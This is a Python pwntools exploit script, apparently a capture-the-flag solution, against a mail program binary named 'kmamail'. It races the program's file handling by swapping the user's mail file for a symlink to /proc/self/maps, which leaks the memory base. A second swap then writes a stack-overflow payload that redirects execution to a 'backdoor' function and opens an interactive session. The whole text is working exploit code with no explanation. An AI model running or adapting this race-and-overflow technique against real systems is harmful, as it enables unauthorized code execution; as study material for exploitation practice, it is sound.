#!/usr/bin/env python3
from pwn import *
import os, re, time, shutil

context.binary = elf = ELF("./kmamail", checksec=False)


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def m(io, x): io.sendlineafter(b"> ", str(x).encode())

def reg(io, u, p):
    m(io, 1)
    io.sendlineafter(b"Username: ", u)
    io.sendlineafter(b"Password: ", p)

def login(io, u, p):
    m(io, 2)
    io.sendlineafter(b"Username: ", u)
    io.sendlineafter(b"Password: ", p)

def put(path, data=None, link=None):
    if os.path.lexists(path):
        os.unlink(path)
    if link:
        os.symlink(link, path)
    else:
        open(path, "wb").write(data)

def main():
    if os.path.isdir("./data"):
        shutil.rmtree("./data")

    io = start()
    u = b"a"
    p = b"a"
    mail = "./data/a/mail"

    reg(io, u, p)
    login(io, u, p)

    put(mail, b"A"*0x400)
    m(io, 2)
    time.sleep(0.15)
    put(mail, link="/proc/self/maps")
    out = io.recvuntil(b"---- MENU ----")

    s, off = re.search(
        rb"([0-9a-f]+)-[0-9a-f]+\s+\S+\s+([0-9a-f]+)\s+[0-9a-f:]+\s+\d+\s+.*?/kmamail(?:\n|$)",
        out
    ).groups()
    base = int(s, 16) - int(off, 16)

    ret = base + 0x101a
    bd  = base + elf.sym.backdoor

    put(mail, b"0123456789")
    m(io, 2)
    time.sleep(0.15)
    put(mail, b"S\nT\n" + b"A"*0x2c + p8(0x57) + p64(ret) + p64(bd) + b"\n")

    io.interactive()

if __name__ == "__main__":
    main()
